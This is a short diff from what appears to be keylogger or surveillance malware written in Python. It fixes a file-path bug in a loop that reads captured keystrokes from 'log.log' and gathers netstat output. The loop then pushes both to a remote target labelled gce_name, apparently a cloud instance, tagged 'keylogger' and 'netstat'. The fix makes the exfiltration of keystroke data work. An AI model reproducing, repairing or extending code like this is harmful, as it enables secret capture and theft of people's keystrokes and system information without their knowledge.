@@ -30,7 +30,7 @@ def main():
         netstat_data = str(get_netstat())
         push_file(netstat_data, gce_name, "netstat")
 
-        with open(log.log, 'rb') as keyl:
+        with open("log.log", 'rb') as keyl:
             kdata = keyl.readlines()
             push_file(kdata, gce_name, "keylogger")
 
